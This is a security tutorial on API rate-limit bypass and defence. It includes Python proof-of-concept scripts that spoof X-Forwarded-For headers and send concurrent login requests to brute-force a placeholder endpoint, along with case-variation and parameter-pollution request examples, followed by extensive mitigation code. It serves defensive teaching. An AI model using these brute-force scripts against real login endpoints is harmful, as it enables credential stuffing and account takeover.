# API Rate Limit Bypass

## Overview

Rate limiting is a critical security control that prevents abuse of API endpoints. However, poorly implemented rate limits can be bypassed, allowing attackers to perform brute force attacks, credential stuffing, denial of service, and resource exhaustion.

**Severity**: Medium to High  
**OWASP Top 10**: A04:2021 - Insecure Design  
**CWE**: CWE-770

## Technical Explanation

Rate limiting restricts the number of requests a client can make within a time window. Bypass techniques include:
- IP rotation and proxy usage
- Header manipulation (X-Forwarded-For, X-Real-IP)
- Race conditions
- Endpoint variations
- Case sensitivity exploitation

## Attack Scenario

An attacker bypasses login rate limits by manipulating HTTP headers to perform credential stuffing attacks.

## Proof of Concept

### 1. X-Forwarded-For Spoofing

```python
import requests

url = "https://api.example.com/login"

for i in range(1000):
    headers = {
        'X-Forwarded-For': f'192.168.1.{i % 255}',
        'X-Real-IP': f'10.0.0.{i % 255}'
    }
    response = requests.post(url, headers=headers, json={
        'username': 'victim',
        'password': f'password{i}'
    })
```

### 2. Race Condition Exploitation

```python
import asyncio
import aiohttp

async def send_request(session, url):
    async with session.post(url, json={'username': 'admin', 'password': 'test'}) as response:
        return await response.text()

async def race_condition_attack():
    url = "https://api.example.com/login"
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url) for _ in range(100)]
        results = await asyncio.gather(*tasks)
        return results

asyncio.run(race_condition_attack())
```

### 3. Case Sensitivity Bypass

```http
POST /api/login HTTP/1.1
POST /api/Login HTTP/1.1
POST /api/LOGIN HTTP/1.1
POST /API/login HTTP/1.1
```

### 4. Parameter Pollution

```http
POST /api/login?username=admin HTTP/1.1
POST /api/login?username=admin&username=test HTTP/1.1
```

## Impact

- Brute Force Attacks
- Credential Stuffing
- Denial of Service
- Resource Exhaustion
- Account Enumeration
- API Abuse

## Mitigation

### 1. Robust Rate Limiting Implementation

```python
from flask import Flask, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import redis

app = Flask(__name__)

# Use Redis for distributed rate limiting
redis_client = redis.Redis(host='localhost', port=6379, db=0)

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379",
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic
    pass
```

### 2. Multi-Factor Rate Limiting

```python
from functools import wraps
import hashlib

def rate_limit_by_multiple_factors(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # Get multiple identifiers
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        username = request.json.get('username', '')
        
        # Create composite key
        composite = f"{ip}:{user_agent}:{username}"
        key = hashlib.sha256(composite.encode()).hexdigest()
        
        # Check rate limit
        if check_rate_limit(key, limit=5, window=60):
            return f(*args, **kwargs)
        else:
            return jsonify({'error': 'Rate limit exceeded'}), 429
    
    return decorated
```

### 3. Token Bucket Algorithm

```python
import time
from threading import Lock

class TokenBucket:
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity
        self.tokens = capacity
        self.refill_rate = refill_rate
        self.last_refill = time.time()
        self.lock = Lock()
    
    def consume(self, tokens=1):
        with self.lock:
            self._refill()
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False
    
    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        tokens_to_add = elapsed * self.refill_rate
        self.tokens = min(self.capacity, self.tokens + tokens_to_add)
        self.last_refill = now

# Usage
bucket = TokenBucket(capacity=10, refill_rate=1)  # 1 token per second

@app.route('/api/endpoint')
def endpoint():
    if not bucket.consume():
        return jsonify({'error': 'Rate limit exceeded'}), 429
    return jsonify({'success': True})
```

### 4. Distributed Rate Limiting with Redis

```python
import redis
import time

class DistributedRateLimiter:
    def __init__(self, redis_client):
        self.redis = redis_client
    
    def is_allowed(self, key, limit, window):
        """
        Sliding window rate limiter
        """
        now = time.time()
        window_start = now - window
        
        pipe = self.redis.pipeline()
        
        # Remove old entries
        pipe.zremrangebyscore(key, 0, window_start)
        
        # Count requests in window
        pipe.zcard(key)
        
        # Add current request
        pipe.zadd(key, {str(now): now})
        
        # Set expiration
        pipe.expire(key, int(window) + 1)
        
        results = pipe.execute()
        request_count = results[1]
        
        return request_count < limit

redis_client = redis.Redis(host='localhost', port=6379, db=0)
limiter = DistributedRateLimiter(redis_client)

@app.route('/api/login', methods=['POST'])
def login():
    ip = request.remote_addr
    key = f"rate_limit:login:{ip}"
    
    if not limiter.is_allowed(key, limit=5, window=60):
        return jsonify({'error': 'Too many requests'}), 429
    
    # Process login
    return jsonify({'success': True})
```

## Secure Code Example

```python
from flask import Flask, request, jsonify
import redis
import hashlib
import time
from functools import wraps

app = Flask(__name__)
redis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)

class AdvancedRateLimiter:
    def __init__(self, redis_client):
        self.redis = redis_client
    
    def get_client_identifier(self, request):
        """Generate unique client identifier"""
        # Don't trust X-Forwarded-For alone
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        # For authenticated requests, include user ID
        user_id = getattr(request, 'user_id', '')
        
        # Create composite identifier
        identifier = f"{ip}:{user_agent}:{user_id}"
        return hashlib.sha256(identifier.encode()).hexdigest()
    
    def check_rate_limit(self, identifier, endpoint, limits):
        """
        Check multiple rate limit windows
        limits: [(requests, seconds), ...]
        """
        for limit, window in limits:
            key = f"rate_limit:{endpoint}:{identifier}:{window}"
            
            if not self._check_window(key, limit, window):
                return False, f"Rate limit: {limit} requests per {window} seconds"
        
        return True, None
    
    def _check_window(self, key, limit, window):
        """Sliding window counter"""
        now = time.time()
        window_start = now - window
        
        pipe = self.redis.pipeline()
        pipe.zremrangebyscore(key, 0, window_start)
        pipe.zcard(key)
        pipe.zadd(key, {str(now): now})
        pipe.expire(key, int(window) + 1)
        
        results = pipe.execute()
        count = results[1]
        
        return count < limit

limiter = AdvancedRateLimiter(redis_client)

def rate_limit(*limits):
    """
    Decorator for rate limiting
    Usage: @rate_limit((5, 60), (20, 3600))  # 5/min, 20/hour
    """
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            identifier = limiter.get_client_identifier(request)
            endpoint = request.endpoint
            
            allowed, message = limiter.check_rate_limit(identifier, endpoint, limits)
            
            if not allowed:
                return jsonify({'error': message}), 429
            
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/api/login', methods=['POST'])
@rate_limit((5, 60), (20, 3600))  # 5 per minute, 20 per hour
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # Authentication logic
    if authenticate(username, password):
        return jsonify({'success': True, 'token': 'jwt_token'})
    else:
        return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/data', methods=['GET'])
@rate_limit((100, 60), (1000, 3600))  # 100/min, 1000/hour
def get_data():
    return jsonify({'data': 'sensitive information'})
```

## Security Takeaways

1. Implement rate limiting on all sensitive endpoints
2. Use multiple factors for client identification
3. Don't trust client-provided headers alone
4. Implement distributed rate limiting for scalability
5. Use sliding window algorithms
6. Apply different limits for different endpoints
7. Monitor and alert on rate limit violations
8. Implement exponential backoff
9. Use CAPTCHA for repeated violations
10. Log all rate limit events

## References

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Rate Limiting Patterns](https://cloud.google.com/architecture/rate-limiting-strategies-techniques)
